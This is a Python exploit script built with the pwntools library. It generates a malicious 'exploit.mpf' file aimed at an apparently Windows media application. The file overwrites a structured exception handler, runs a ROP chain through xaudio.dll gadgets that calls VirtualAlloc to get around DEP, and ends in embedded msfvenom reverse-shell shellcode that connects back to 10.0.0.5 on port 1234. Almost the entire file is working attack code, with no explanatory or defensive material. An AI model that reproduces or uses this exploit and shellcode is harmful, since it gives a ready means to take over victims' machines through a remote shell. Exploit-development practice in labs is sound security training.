#!/usr/bin/python3
from pwn import *
import pwn

bad_chars = b'\x00\x0d\x1a'
va_iat = 0x100220CC #address of VirtualAlloc in the Index Address Table

#-----------------------------------------------------------------
# return a byte string of all chars.  if filter is true the 
# byte string excludes anything in the global bad_chars array.
#
def all_chars(filter):
    global bad_chars
    all = b''

    for i in range(0x00,0x100): 
        b = i.to_bytes(1, 'little')
        if (filter):
            if (b not in bad_chars):
                all += b
        else:
            all += b
    return all

#-----------------------------------------------------------------
# return a windows reverse shellcode to a virtual machine at 10.0.0.5
# $ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=1234 EXITFUNC=thread -b b'\x00\x0d\x1a' -f python -v shell -a x86 --platform windows
#
def reverseShell():
    shell =  b""
    shell += b"\xba\x86\x98\x2d\xa9\xda\xda\xd9\x74\x24\xf4\x58"
    shell += b"\x2b\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\xd6"
    shell += b"\x96\xcf\x5c\x2a\x4e\x8d\x9f\xd2\x8f\xf2\x16\x37"
    shell += b"\xbe\x32\x4c\x3c\x91\x82\x06\x10\x1e\x68\x4a\x80"
    shell += b"\x95\x1c\x43\xa7\x1e\xaa\xb5\x86\x9f\x87\x86\x89"
    shell += b"\x23\xda\xda\x69\x1d\x15\x2f\x68\x5a\x48\xc2\x38"
    shell += b"\x33\x06\x71\xac\x30\x52\x4a\x47\x0a\x72\xca\xb4"
    shell += b"\xdb\x75\xfb\x6b\x57\x2c\xdb\x8a\xb4\x44\x52\x94"
    shell += b"\xd9\x61\x2c\x2f\x29\x1d\xaf\xf9\x63\xde\x1c\xc4"
    shell += b"\x4b\x2d\x5c\x01\x6b\xce\x2b\x7b\x8f\x73\x2c\xb8"
    shell += b"\xed\xaf\xb9\x5a\x55\x3b\x19\x86\x67\xe8\xfc\x4d"
    shell += b"\x6b\x45\x8a\x09\x68\x58\x5f\x22\x94\xd1\x5e\xe4"
    shell += b"\x1c\xa1\x44\x20\x44\x71\xe4\x71\x20\xd4\x19\x61"
    shell += b"\x8b\x89\xbf\xea\x26\xdd\xcd\xb1\x2e\x12\xfc\x49"
    shell += b"\xaf\x3c\x77\x3a\x9d\xe3\x23\xd4\xad\x6c\xea\x23"
    shell += b"\xd1\x46\x4a\xbb\x2c\x69\xab\x92\xea\x3d\xfb\x8c"
    shell += b"\xdb\x3d\x90\x4c\xe3\xeb\x37\x1c\x4b\x44\xf8\xcc"
    shell += b"\x2b\x34\x90\x06\xa4\x6b\x80\x29\x6e\x04\x2b\xd0"
    shell += b"\xf9\x21\xac\xda\xfc\x5d\xae\xda\xfa\x4f\x27\x3c"
    shell += b"\x68\x60\x6e\x97\x05\x19\x2b\x63\xb7\xe6\xe1\x0e"
    shell += b"\xf7\x6d\x06\xef\xb6\x85\x63\xe3\x2f\x66\x3e\x59"
    shell += b"\xf9\x79\x94\xf5\x65\xeb\x73\x05\xe3\x10\x2c\x52"
    shell += b"\xa4\xe7\x25\x36\x58\x51\x9c\x24\xa1\x07\xe7\xec"
    shell += b"\x7e\xf4\xe6\xed\xf3\x40\xcd\xfd\xcd\x49\x49\xa9"
    shell += b"\x81\x1f\x07\x07\x64\xf6\xe9\xf1\x3e\xa5\xa3\x95"
    shell += b"\xc7\x85\x73\xe3\xc7\xc3\x05\x0b\x79\xba\x53\x34"
    shell += b"\xb6\x2a\x54\x4d\xaa\xca\x9b\x84\x6e\xea\x79\x0c"
    shell += b"\x9b\x83\x27\xc5\x26\xce\xd7\x30\x64\xf7\x5b\xb0"
    shell += b"\x15\x0c\x43\xb1\x10\x48\xc3\x2a\x69\xc1\xa6\x4c"
    shell += b"\xde\xe2\xe2"
    return shell

#-----------------------------------------------------------------
# return the VirtualAlloc function call stub
#
def getVAStub():
    va = (
        pwn.p32(0x60606060) +   #VirtualAllocation address
        pwn.p32(0x61616161) +   #return address - this will get changed to the address of our shellcode
        pwn.p32(0x62626262) +   #lpAddress - this will get changed to the address of our shellcode
        pwn.p32(0x63636363) +   #dwSize - this get changed to a value from 0x01-0x999
        pwn.p32(0x64646464) +   #flAllocationType - this get changed to 0x1000 to commit the change
        pwn.p32(0x65656565)     #flProtect - this will get changed to 0x40
    )
    return va

#-----------------------------------------------------------------
#get the ROP chain
#   rop_chain_max = max length of rop chain
# 
def getRopChain(rop_chain_max):
            
    rop = (
        #1) leak the VirtualAlloc address
        pwn.p32(0x1001b947) + #: push esp ; and al, 0x0C ; neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ; 
        pwn.p32(0x1001c257) + #: pop eax ; ret  ;  (1 found)
        4 * pwn.p32(0xdeadbeef) + #retn 0x0010
        pwn.p32(va_iat) + #VirtualAlloc index address table address
        pwn.p32(0x1001cd5c) + #: mov eax, dword [eax] ; ret  ;  (1 found)
               
        #2) overwrite the VA address in the stub
        pwn.p32(0x1001cfec) + #: xor edx, edx ; ret  ;  (1 found)
        pwn.p32(0x1001b12e) + #: add edx, ebx ; pop ebx ; retn 0x0010 ;  (1 found))
        pwn.p32(0xdeadbee1) + 
        pwn.p32(0x10010329) + #: pop ebx ; ret  ;  (1 found))
        4 * pwn.p32(0xdeadbeef) +        
        pwn.p32(0xffffffe4) + #-0x1c
        pwn.p32(0x1001b12e) + #: add edx, ebx ; pop ebx ; retn 0x0010 ;  (1 found))
        pwn.p32(0xdeadbeef) +
        pwn.p32(0x10018e0a) + #: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
        4 * pwn.p32(0xdeadbeef) +

        #3) overwrite the return address 1 in the stub
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x100205dc) + #: mov eax, edx ; ret  ;  (1 found))
        pwn.p32(0x100102c3) + #: pop esi ; ret  ;  (1 found))
        pwn.p32(0xfffff3bc) + #-0xc44
        pwn.p32(0x100205d5) + #: sub eax, esi ; pop edi ; pop esi ; ret  ;  (1 found)
        2 * pwn.p32(0xdeadbeef) +
        pwn.p32(0x10018e0a) + #: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)
        
        #4) overwrite the return address 2 in the stub
        pwn.p32(0x100205dc) + #: mov eax, edx ; ret  ;  (1 found))
        pwn.p32(0x100102c3) + #: pop esi ; ret  ;  (1 found))
        pwn.p32(0xfffff3bc) + #-0xc44
        pwn.p32(0x100205d5) + #: sub eax, esi ; pop edi ; pop esi ; ret  ;  (1 found)
        2 * pwn.p32(0xdeadbeef) +
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10018e0a) + #: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)

        #5) set dwSize to 0x03 - this can be any value from 0x01-0xfff and eax is 0x3 from last gadget
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10018e0a) + #: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)

        #6) set flAllocationType to 0x1000
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x1001c257) + #: pop eax ; ret  ;  (1 found)
        pwn.p32(0xfffff001) + # -0xfff
        pwn.p32(0x10020861) + #: neg eax ; ret  ;  (1 found)
        pwn.p32(0x1001b779) + #: inc eax ; ret  ;  (1 found)
        pwn.p32(0x10018e0a) + #: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)

        #7) set flProtect to 0x40
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x10016086) + #: inc edx ; cld  ; pop esi ; pop edi ; pop ebx ; ret  ;  (1 found)
        3 * pwn.p32(0xdeadbeef) + 
        pwn.p32(0x1001c257) + #: pop eax ; ret  ;  (1 found)
        pwn.p32(0xffffffc0) + # -0x40
        pwn.p32(0x10020861) + #: neg eax ; ret  ;  (1 found)
        pwn.p32(0x10018e0a) + #: mov dword [edx], eax ; mov eax, 0x00000003 ; ret  ;  (1 found)

        #8) jump to VA function
        pwn.p32(0x1001b947) + #: push esp ; and al, 0x0C ; neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
        pwn.p32(0x10019329) + #: mov eax, ebx ; pop esi ; pop ebx ; ret  ;  (1 found)
        0x16*pwn.p32(0x1001ac57) + #: sub eax, 0x20 ; ret  ;  (1 found))
        0x20*pwn.p32(0x1001647a) + #: dec eax ; ret  ;  (1 found))
        pwn.p32(0x1001c341) + #: xchg eax, ebp ; dec eax ; ret  ;  (1 found)
        pwn.p32(0x1001028d) + #: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
        pwn.p32(0xdeadbeef) 

    )
    rop += b'R'*(rop_chain_max-len(rop))
    return rop

#--------------------------------------------------------------------------
# main function
#
def main():
    nseh = b'BBBB' #nseh not used because DEP is enabled
    seh = pwn.p32(0x1001ee2a)  #from xaudio.dll; 0x1001ee2a: add esp, 0x00001004 ; ret  ;  
    nseh_offset = 4112 #padding before we get to our NSEH overwrite
    rop_offset = 1024  #padding before we get to our rop chain 
    rop_chain_max = 2500  #maximum of 2500 bytes for the rop chain
    rop_chain = getRopChain(rop_chain_max) 
    
    assert len(rop_chain) <= rop_chain_max, "your ROP chain is too long!!"
    
    va = getVAStub()
    rs = reverseShell()
    payload = (
        b'A'*(rop_offset-len(va)) +
        va + 
        rop_chain + 
        b'C'*(nseh_offset-rop_offset-len(rop_chain)) + 
        nseh + 
        seh + 
        b'\x90'*24 + 
        rs
    )

    f = open('exploit.mpf', 'wb')
    f.write(payload)
    f.close()

#-----------------------------------------------------------
#main entry point
#
if __name__ == "__main__":
    main()